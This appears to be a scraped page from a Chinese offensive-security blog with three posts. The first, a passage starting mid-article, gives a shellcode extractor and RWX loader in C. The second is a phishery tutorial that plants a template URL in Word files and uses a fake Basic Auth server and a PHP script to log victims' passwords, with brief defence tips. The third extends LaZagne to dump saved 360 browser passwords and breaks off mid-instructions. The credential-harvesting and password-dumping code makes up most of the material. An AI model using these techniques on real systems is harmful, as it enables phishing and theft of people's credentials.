<p>可以看到各个函数保存在一段连续的地址，并且shellcode起始函数位于最开始</p>

<p>双击第一个函数shell_code(void)，进入IDA文本视图，可查看shell_code(void)函数具体在exe文件中的位置为<code class="language-plaintext highlighter-rouge">00000400</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-16/2-2.png" alt="Alt text"></p>

<p>查看main函数在exe文件中的位置为<code class="language-plaintext highlighter-rouge">00000A00</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-16/2-3.png" alt="Alt text"></p>

<p>结合c代码的结构，推断出在exe文件中的偏移范围<code class="language-plaintext highlighter-rouge">00000400-00000A00</code>即为我们需要的机器码</p>

<p>使用十六进制编辑器将其中的机器码提取并保存到文件中，文件中的内容即我们需要的shellcode</p>

<p>当然，以上手动提取机器码并保存到文件的功能可通过程序自动实现，完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdafx.h&gt;
#include &lt;windows.h&gt;
#include &lt;Winternl.h&gt;
#pragma optimize( "", off ) 
void shell_code();
HANDLE GetKernel32Handle();
BOOL __ISUPPER__(__in CHAR c);
CHAR __TOLOWER__(__in CHAR c);
UINT __STRLEN__(__in LPSTR lpStr1);
UINT __STRLENW__(__in LPWSTR lpStr1);
LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);
INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);
INT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen);
LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);

typedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);
typedef ULONG (WINAPI *MESSAGEBOXAPI)(HWND, LPWSTR, LPWSTR, ULONG);


void shell_code() {

	LoadLibraryWAPI	loadlibrarywapi = 0;
	GetProcAddressAPI getprocaddressapi=0;
	MESSAGEBOXAPI messageboxapi=0;

	wchar_t struser32[] = { L'u', L's', L'e', L'r', L'3',L'2', L'.', L'd', L'l', L'l', 0 };
	char MeassageboxA_api[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };

	HANDLE hKernel32 = GetKernel32Handle();
	if (hKernel32 == INVALID_HANDLE_VALUE) {
		return;
	}
	LPBYTE lpBaseAddr = (LPBYTE)hKernel32;
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr-&gt;e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNames);
	LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfFunctions);
	LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNameOrdinals);
	CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 };
	CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

	for (UINT i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) {
		LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);
		if (!__STRCMPI__(pFuncName, strGetProcAddress)) {
			getprocaddressapi=(GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);
		}
		else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) {
			loadlibrarywapi=(LoadLibraryWAPI) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		}
		if (getprocaddressapi != nullptr &amp;&amp; loadlibrarywapi != nullptr) {				
			messageboxapi=(MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api);
			messageboxapi(NULL, NULL, NULL, 0);
			return;
		}
	}
}

inline BOOL __ISUPPER__(__in CHAR c) {
	return ('A' &lt;= c) &amp;&amp; (c &lt;= 'Z');
};
inline CHAR __TOLOWER__(__in CHAR c) {
	return __ISUPPER__(c) ? c - 'A' + 'a' : c;
};

UINT __STRLEN__(__in LPSTR lpStr1)
{
	UINT i = 0;
	while (lpStr1[i] != 0x0)
		i++;
	return i;
}

UINT __STRLENW__(__in LPWSTR lpStr1)
{
	UINT i = 0;
	while (lpStr1[i] != L'\0')
		i++;
	return i;
}

LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)
{
	CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);
	if (!c)
		return lpStr1;
	UINT dwLen = __STRLENW__(lpStr2);
	do
	{
		CHAR sc;
		do
		{
			sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);
			if (!sc)
				return NULL;
		} while (sc != c);
	} while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);
	return (lpStr1 - 1); // FIXME -2 ?
}

INT __STRCMPI__(
	__in LPSTR lpStr1,
	__in LPSTR lpStr2)
{
	int  v;
	CHAR c1, c2;
	do
	{
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		// The casts are necessary when pStr1 is shorter &amp; char is signed 
		v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
	} while ((v == 0) &amp;&amp; (c1 != '\0') &amp;&amp; (c2 != '\0'));
	return v;
}

INT __STRNCMPIW__(
	__in LPWSTR lpStr1,
	__in LPWSTR lpStr2,
	__in DWORD dwLen)
{
	int  v;
	CHAR c1, c2;
	do {
		dwLen--;
		c1 = ((PCHAR)lpStr1++)[0];
		c2 = ((PCHAR)lpStr2++)[0];
		/* The casts are necessary when pStr1 is shorter &amp; char is signed */
		v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
	} while ((v == 0) &amp;&amp; (c1 != 0x0) &amp;&amp; (c2 != 0x0) &amp;&amp; dwLen &gt; 0);
	return v;
}

LPSTR __STRCAT__(
	__in LPSTR	strDest,
	__in LPSTR strSource)
{
	LPSTR d = strDest;
	LPSTR s = strSource;
	while (*d) d++;
	do { *d++ = *s++; } while (*s);
	*d = 0x0;
	return strDest;
}

LPVOID __MEMCPY__(
	__in LPVOID lpDst,
	__in LPVOID lpSrc,
	__in DWORD dwCount)
{
	LPBYTE s = (LPBYTE)lpSrc;
	LPBYTE d = (LPBYTE)lpDst;
	while (dwCount--)
		*d++ = *s++;
	return lpDst;
}

HANDLE GetKernel32Handle() {
	HANDLE hKernel32 = INVALID_HANDLE_VALUE;
#ifdef _WIN64
	PPEB lpPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB lpPeb = (PPEB)__readfsdword(0x30);
#endif
	PLIST_ENTRY pListHead = &amp;lpPeb-&gt;Ldr-&gt;InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead-&gt;Flink;
	WCHAR strDllName[MAX_PATH];
	WCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };

	while (pListEntry != pListHead) {
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry-&gt;FullDllName.Length) {
			DWORD dwLen = pModEntry-&gt;FullDllName.Length;
			__MEMCPY__(strDllName, pModEntry-&gt;FullDllName.Buffer, dwLen);
			strDllName[dwLen / sizeof(WCHAR)] = L'\0';
			if (__STRSTRIW__(strDllName, strKernel32)) {
				hKernel32 = pModEntry-&gt;DllBase;
				break;
			}
		}
		pListEntry = pListEntry-&gt;Flink;
	}
	return hKernel32;
}
void __declspec(naked) END_SHELLCODE(void) {}
int main()
{
	shell_code();

	FILE *output_file;
	fopen_s(&amp;output_file,"shellcode.bin", "wb");
	fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);
	fclose(output_file);
	return 0;
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>打开文件需要以”wb”模式打开二进制文件 
如果以”w”模式，写入文件的过程中，0A字符会被替换为0D0A,导致shellcode出现问题</p>

<h2 id="0x04-shellcode测试">0x04 Shellcode测试</h2>
<hr>

<p>使用以下代码可读取文件中保存的shellcode，加载并测试其功能：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
size_t GetSize(char * szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}
unsigned char* ReadBinaryFile(char *szFilePath, size_t *size)
{
	unsigned char *p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;		
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		printf("Binary file does not exists!\n");
		return 0;
	}
	p = new unsigned char[*size];
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}
int main(int argc, char* argv[])
{
	char *szFilePath="c:\\test\\shellcode.bin";
	unsigned char *BinData = NULL;
	size_t size = 0;	
	BinData = ReadBinaryFile(szFilePath, &amp;size);
	void *sc = VirtualAlloc(0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (sc == NULL)	
		return 0;	
	memcpy(sc, BinData, size);
	(*(int(*)()) sc)();	
	return 0;
}
</code></pre></div></div>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February 16, 2017
  </div>

  
</article><article class="post">
  <h1>Phishing credentials via Basic Authentication(phishery)利用测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>phishery是一个简单的支持SSL的HTTP服务器，其主要目的是通过基本身份验证钓鱼获得目标的凭据。</p>

<p>本文将要对其进行测试，介绍测试细节，分析实现原理，扩展用法。</p>

<p>phishery地址：</p>

<p>https://github.com/ryhanson/phishery</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>phishery实际测试</li>
  <li>实现原理</li>
  <li>补充1： 使用openssh制作证书</li>
  <li>补充2： php实现Basic Authentication</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-phishery实际测试">0x02 phishery实际测试</h2>
<hr>

<p>测试系统： Win7x64</p>

<p>下载编译好的程序：</p>

<p>https://github.com/ryhanson/phishery/releases/download/v1.0.2/phishery1.0.2windows-amd64.tar.gz</p>

<h3 id="1生成word文档">1、生成word文档</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
</code></pre></div></div>

<p>参数说明：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">https://secure.site.local/docs</code>作为伪造的web服务器地址，docs为文件名称(该文件必须存在，默认对应文件template.dotx)，目标用户在打开bad.docx时，会显示该域名</li>
  <li>good.docx为输入的word文档，文档为正常内容</li>
  <li>bad.docx为输出的word文档，在good.docx中插入Word document template</li>
</ul>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/2-1.png" alt="Alt text"></p>

<h3 id="2启动https-auth-server">2、启动HTTPS Auth Server</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phishery
</code></pre></div></div>

<p>默认加载的配置文件为同级目录下的<code class="language-plaintext highlighter-rouge">settings.json</code></p>

<p>内容如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  "ip": "0.0.0.0",
  "port": "443",
  "sslCert": "server.crt",
  "sslKey": "server.key",
  "basicRealm": "Secure Document Gateway",
  "responseStatus": 200,
  "responseFile": "template.dotx",
  "responseHeaders": [
    ["Content-Type", "application/vnd.openxmlformats-officedocument.wordprocessingml.template"]
  ]
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>server.crt和server.key为工程中包含的测试证书文件，后面会介绍证书文件的生成方法</p>

<p>默认将获取的目标用户凭据保存在文件<code class="language-plaintext highlighter-rouge">credentials.json</code></p>

<p>程序运行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/2-2.png" alt="Alt text"></p>

<h3 id="3欺骗目标用户点击baddocx">3、欺骗目标用户点击bad.docx</h3>

<p>目标用户需要满足以下条件：</p>

<h4 id="1能够解析域名">(1)能够解析域名</h4>

<p>可选择以下三种方法：</p>

<p>方法1： 通过域名提供商，将域名解析到HTTPS Auth Server的IP地址</p>

<p>域名需要具有欺骗性</p>

<p>方法2： 修改网关的配置，将域名解析到HTTPS Auth Server的IP地址</p>

<p>需要获得网关配置的修改权限</p>

<p>方法3： 修改目标用户测试环境的hosts文件，将域名解析到HTTPS Auth Server的IP地址</p>

<p>仅作测试</p>

<p><strong>注：</strong></p>

<p>直接使用IP也可以，但是不具有欺骗性</p>

<h4 id="2信任https-auth-server的证书文件">(2)信任HTTPS Auth Server的证书文件</h4>

<p>可选择以下三种方法：</p>

<p>方法1： HTTPS Auth Server的证书文件由权威CA机构颁发，目标信任该CA机构</p>

<p>将csr文件发送给CA机构进行校验，若审核通过，CA机构使用自己的私钥对csr文件进行签名，生成证书文件(.crt文件)</p>

<p>方法2： 使用可信的证书</p>

<p>方法3： 目标用户添加对证书的信任</p>

<p>将自签名证书安装到受信任的根证书颁发机构</p>

<p>如果目标用户不信任HTTPS Auth Server的证书文件，在打开文档时会弹出提示，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/3-1.png" alt="Alt text"></p>

<p>只有用户选择Yes，才会弹出输入凭据的对话框，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/3-2.png" alt="Alt text"></p>

<p>对话框中的域名同伪造的web服务器地址相同</p>

<p>目标用户输入凭据后，HTTPS Auth Server获得用户输入的凭据，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/3-3.png" alt="Alt text"></p>

<p>接下来，显示word文档的正常内容</p>

<h2 id="0x03-实现原理">0x03 实现原理</h2>
<hr>

<h3 id="1basic-authentication">1、Basic Authentication</h3>

<p>客户端在访问服务器时，如果服务器返回401 Unauthozied，并且Response的header为<code class="language-plaintext highlighter-rouge">WWW-Authenticate: Basic realm="xxxx"</code></p>

<p>客户端将自动弹出一个登录窗口，要求用户输入用户名和口令</p>

<p>例如，通过IE访问https://secure.site.local/docs，弹出对话框，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/4-1.png" alt="Alt text"></p>

<p>客户端输入用户名和口令后，将用户名及口令以base64加密方式加密并发送</p>

<h3 id="2word文档的word-document-template">2、Word文档的Word document template</h3>

<p>Word文档的Word document template可插入URL，在打开Word文档时，自动访问该URL</p>

<p><strong>注：</strong></p>

<p>必须为https，不支持http</p>

<p>查看方法：</p>

<p><code class="language-plaintext highlighter-rouge">开发工具</code>-&gt;<code class="language-plaintext highlighter-rouge">加载项</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/4-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>Excel和PowerPoint无法使用这个方法</p>

<h3 id="3服务器接收消息base64解密获得用户名和口令">3、服务器接收消息，base64解密获得用户名和口令</h3>

<p>对应程序源代码：</p>

<p>https://github.com/ryhanson/phishery/blob/master/phish/phishery.go#L50</p>

<h2 id="0x04-补充1-使用openssh制作证书">##0x04 补充1： 使用openssh制作证书</h2>

<h3 id="1安装openssh">1、安装openssh</h3>

<p>Ubuntu：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get install openssl
</code></pre></div></div>

<p>Windows：</p>

<p>下载Apache，地址如下：</p>

<p>http://httpd.apache.org/download.cgi</p>

<p>安装Apache后默认安装openssl，位于\Apache24\bin</p>

<h3 id="2生成私钥文件testcomkey和证书签名请求testcomcsr">2、生成私钥文件test.com.key和证书签名请求test.com.csr</h3>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl x509 -req -days 3650 -in test.com.csr -signkey test.com.key -out test.com.crt
</code></pre></div></div>

<p>如果证书缺少主题备用名称SAN (Subject Alternate Name)，需要通过配置文件进行添加</p>

<p>参考资料：</p>

<p>https://support.citrix.com/article/CTX135602_</p>

<p>新建文件req.cnf，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no
[req_distinguished_name]
C = US
ST = VA
L = SomeCity
O = MyCompany
OU = MyDivision
CN = test.com
[v3_req]
keyUsage = critical, digitalSignature, keyAgreement
extendedKeyUsage = serverAuth
subjectAltName = @alt_names
[alt_names]
DNS.1 = test.com
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>CN和DNS.1都需要设定为域名(测试域名为test.com)</p>

<p>生成私钥和自签名证书：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout test.com.key -out test.com.crt -config req.cnf -sha256
</code></pre></div></div>

<p>更多参数的细节可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B02-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0https%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/">《CIA Hive Beacon Infrastructure复现2——使用Apache mod_rewrite实现https流量分发》</a></p>

<h2 id="0x05-补充2-php实现basic-authentication">0x05 补充2： php实现Basic Authentication</h2>
<hr>

<p>php环境使用phpstudy搭建</p>

<h3 id="1phpstudy开启ssl">1、phpstudy开启ssl</h3>

<h4 id="1修改apache目录下的httpdconf配置文件">(1)修改apache目录下的httpd.conf配置文件</h4>

<p>定位<code class="language-plaintext highlighter-rouge">#LoadModule ssl_module modules/mod_ssl.so</code>，去掉注释符<code class="language-plaintext highlighter-rouge">#</code></p>

<p><code class="language-plaintext highlighter-rouge"># Secure (SSL/TLS) connections</code>下添加一行<code class="language-plaintext highlighter-rouge">Include conf/vhosts_ssl.conf</code></p>

<h4 id="2在conf文件夹下创建文件vhosts_sslconf">(2)在conf文件夹下创建文件vhosts_ssl.conf</h4>

<p>内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Listen 443
SSLStrictSNIVHostCheck off
SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL
SSLProtocol all -SSLv2 -SSLv3
&lt;VirtualHost *:443&gt;
    DocumentRoot "C:\WWW"
    ServerName test.com
  &lt;Directory "C:\WWW"&gt;
      Options FollowSymLinks ExecCGI
      AllowOverride All
      Order allow,deny
      Allow from all
      Require all granted
  &lt;/Directory&gt;
SSLEngine on
SSLCertificateFile "C:\Apache\conf\ssl\test.com.crt"
SSLCertificateKeyFile "C:\Apache\conf\ssl\test.com.key"
&lt;/VirtualHost&gt;
</code></pre></div></div>

<h4 id="3重启phpstudy">(3)重启phpstudy</h4>

<p>访问<code class="language-plaintext highlighter-rouge">https://127.0.0.1</code>，验证</p>

<h3 id="2php实现basic-authentication记录用户口令">2、php实现Basic Authentication，记录用户口令</h3>

<p>php代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
if(!isset($_SERVER['PHP_AUTH_USER']) or !isset($_SERVER['PHP_AUTH_PW']))
{
	file_put_contents("log.txt","ClientIP:".$_SERVER['REMOTE_ADDR']."\r\n",FILE_APPEND);
	header('WWW-Authenticate: Basic realm="Document Security"');
	header('HTTP/1.0 401 Unauthorized');
} 
else 
{
	file_put_contents("log.txt","ClientIP:".$_SERVER['REMOTE_ADDR'].",".$_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']."\r\n",FILE_APPEND);
    print "File Not Found";	
}
</code></pre></div></div>

<p>代码实现了记录用户口令并写入文件log.txt，返回用户的内容为<code class="language-plaintext highlighter-rouge">File Not Found</code></p>

<p><strong>注：</strong></p>

<p>该php脚本可以作为phishery的HTTPS Auth Server</p>

<p>通过php实现Basic Authentication，如果不使用https，弹出的对话框会多一些提示，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/4-3.png" alt="Alt text"></p>

<p>如果不使用https，无法作为Word document template插入Word文档</p>

<h2 id="0x06-防御建议">0x06 防御建议</h2>
<hr>

<p>检测到的实际攻击活动：</p>

<p>https://researchcenter.paloaltonetworks.com/2018/08/unit42-darkhydrus-uses-phishery-harvest-credentials-middle-east/</p>

<p>结合本文的分析和实际攻击活动的细节，给出如下建议：</p>

<ul>
  <li>正常word文档很少会要求用户输入凭据</li>
  <li>对域名的证书进行检查(针对https)</li>
  <li>对域名进行识别，是否是伪造的域名</li>
</ul>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文对phishery进行测试，介绍测试细节，分析实现原理，补充了php实现Basic Authentication的方法，最后给出防御建议</p>

<p>个人认为phishery的另一个作用：将内网的一台Windows主机作为服务器，用于记录目标输入的凭据</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August 20, 2018
  </div>

  
</article><article class="post">
  <h1>本地密码查看工具LaZagne中的自定义脚本开发</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>LaZagne是一款用于检索大量存储在本地计算机密码的开源应用程序。
因为每个软件储存密码的方式不尽相同（明文、API、定制算法、数据库等），所以该工具使用多种方法获取软件密码，目前支持的软件如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/0.png" alt="Alt text"></p>

<p>该工具通过python开发，易读、易维护，所以本文就尝试对其扩展，编写python脚本实现对360极速浏览器的密码导出，并且介绍脚本开发过程的细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>解决LaZagne中的bug</li>
  <li>开发脚本导出360极速浏览器密码</li>
  <li>使用py2exe将python脚本转成exe</li>
  <li>使用PyInstaller将python脚本转成exe</li>
</ul>

<h2 id="0x02-lazagne中的bug">0x02 LaZagne中的bug</h2>
<hr>

<p><strong>LaZagne下载地址：</strong></p>

<p>https://github.com/AlessandroZ/LaZagne</p>

<p>python版本：2.7</p>

<p>下载后执行<code class="language-plaintext highlighter-rouge">\LaZagne-master\LaZagne-master\Windows\laZagne.py</code></p>

<p>报错，缺少第三方扩展包pyasn1和psutil</p>

<p><strong>安装第三方扩展包：</strong></p>

<p><code class="language-plaintext highlighter-rouge">
C:\Python27\Scripts\easy_install.exe pyasn1</code></p>

<p><code class="language-plaintext highlighter-rouge">
C:\Python27\Scripts\easy_install.exe psutil
</code></p>

<p>再次执行<code class="language-plaintext highlighter-rouge">\LaZagne-master\LaZagne-master\Windows\laZagne.py</code></p>

<p>仍然报错，提示如下：</p>

<p><code class="language-plaintext highlighter-rouge">ImportError: No module named memorpy</code></p>

<p><del>经过搜索，并没有第三方扩展包memorpy，猜测是输入错误，正确的应该为<code class="language-plaintext highlighter-rouge">memory_profiler</code></del></p>

<p><del><strong>安装扩展包memory_profiler：</strong></del></p>

<p><del><code class="language-plaintext highlighter-rouge">C:\Python27\Scripts\easy_install.exe memory_profiler</code></del></p>

<p><del>并且修改源文件：</del></p>

<p><del>路径为<code class="language-plaintext highlighter-rouge">\LaZagne-master\LaZagne-master\Windows\lazagne\softwares\memory\memorydump.py</code></del></p>

<p><del>Line14：<code class="language-plaintext highlighter-rouge">from memorpy import *</code></del></p>

<p><del>修改为</del></p>

<p><del><code class="language-plaintext highlighter-rouge">from memory_profiler import *</code></del></p>

<p><del>成功执行laZagne.py，如下图</del></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/1-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>改成<code class="language-plaintext highlighter-rouge">memory_profiler</code>后虽然成功编译，但是运行memory模块时会报错，提示Process没有list方法(bug发现和修改方法来自于<a href="https://github.com/burnegg">@burnegg</a>)</p>

<p>修改思路：</p>

<p>改回<code class="language-plaintext highlighter-rouge">memorpy</code></p>

<p>安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Python27\Scripts\pip.exe install https://github.com/n1nj4sec/memorpy/archive/master.zip
</code></pre></div></div>

<h2 id="0x03-开发脚本导出360极速浏览器密码">0x03 开发脚本导出360极速浏览器密码</h2>
<hr>

<p>原工程提示开发自定义脚本可参考：</p>

<p>https://github.com/AlessandroZ/LaZagne/wiki</p>

<p>但是该网页并没有提示信息，经过分析代码结构，得出以下修改方法</p>

<p><strong>360极速浏览器：</strong></p>

<p>360极速浏览器使用chrome内核，猜测存储密码的功能同Chrome相近，因此使用360极速浏览器作为测试对象</p>

<p>360极速浏览器提供密码保存功能，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/1-2.png" alt="Alt text"></p>

<p>经测试发现：</p>

<p>Chrome保存密码的文件路径为：</p>

<p><code class="language-plaintext highlighter-rouge">
C:\Users\1\Local Settings\Application Data\Google\Chrome\User Data\
</code></p>

<p><code class="language-plaintext highlighter-rouge">
C:\Users\1\AppData\Local\Google\Chrome\User Data\
</code></p>

<p>360极速浏览器保存密码的文件路径为：</p>

<p><code class="language-plaintext highlighter-rouge">
C:\Users\1\Local Settings\Application Data\360Chrome\Chrome\User Data\
</code></p>

<p><code class="language-plaintext highlighter-rouge">
C:\Users\1\AppData\Local\360Chrome\Chrome\User Data\
</code></p>

<p>经过对比，二者的差别仅在文件名存在差异，数据结构相同</p>

<h3 id="添加360极速浏览器密码导出功能">添加360极速浏览器密码导出功能：</h3>

<p><strong>1、修改\LaZagne-master\Windows\lazagne\config\manageModules.py</strong></p>

<p>(1)Line6添加如下代码：</p>

<p><code class="language-plaintext highlighter-rouge">from lazagne.softwares.browsers.cse import CSE</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/3-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>lazagne.softwares.browsers.cse表示文件名</p>

<p>import CSE表示类名为CSE</p>

<p>(2)Line6添加如下代码：</p>

<p><code class="language-plaintext highlighter-rouge">CSE(),</code></p>

<p><strong>注：</strong></p>

<p>添加moduleNames，对应类名CSE</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/3-2.png" alt="Alt text"></p>

<p>详细代码可参照：</p>

<p>https://github.com/3gstudent/LaZagne/blob/master/Windows/lazagne/config/manageModules.py</p>

<p><strong>2、在\LaZagne-master\Windows\lazagne\softwares\browsers新建文件cse.py</strong></p>

<p>文件内容参照同级目录的chrome.py，如下位置作修改即可：</p>

<p>(1)Line10修改为<code class="language-plaintext highlighter-rouge">class CSE(ModuleInfo):</code></p>

<p><strong>注：</strong></p>

<p>设置类名</p>

<p>(2)</p>

<p>Line12修改为<code class="language-plaintext highlighter-rouge">options = {'command': '-360cse', 'action': 'store_true', 'dest': '360CSE', 'help': 'cse'}</code></p>

<p><strong>注：</strong></p>

<p>‘command’不能同chrome的-c重复</p>

<p>‘dest’表示显示导出浏览器密码的标题</p>

<p>(3)</p>

<p>Line22修改为360路径<code class="language-plaintext highlighter-rouge">\Local Settings\Application Data\360Chrome\Chrome\User Data\</code></p>

<p>Line23修改为360路径<code class="language-plaintext highlighter-rouge">\AppData\Local\360Chrome\Chrome\User Data\</code></p>

<p>完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	homedrive + homepath + '\\Local Settings\\Application Data\\360Chrome\\Chrome\\User Data', 
	homedrive + homepath + '\\AppData\\Local\\360Chrome\\Chrome\\User Data', 
</code></pre></div></div>

<p>(4)其他提示信息将chrome换成360cse就好</p>

<p>详细代码可参照：</p>

<p>https://github.com/3gstudent/LaZagne/blob/master/Windows/lazagne/softwares/browsers/cse.py</p>

<p>保存文件，再次执行laZagne.exe</p>

<p>成功导出360极速浏览器保存的密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-9/3-3.png" alt="Alt text"></p>

<h2 id="0x04-使用py2exe将python脚本转成exe">0x04 使用py2exe将python脚本转成exe</h2>
<hr>

<p>LaZagne提供了编译好的Windows版本，下载地址如下：</p>

<p>https://github.com/AlessandroZ/LaZagne/releases/</p>

<p>但是如果想扩展功能，例如添加导出360极速浏览器密码的功能，就需要找到自己编译的方法</p>

<p>使用py2exe的方法如下：</p>

<p><strong>1、下载py2exe</strong></p>

<p>地址如下：</p>

<p>https://sourceforge.net/projects/py2exe/</p>

<p><strong>2、新建mysetup.py</strong></p>

<p>内容如下：</p>

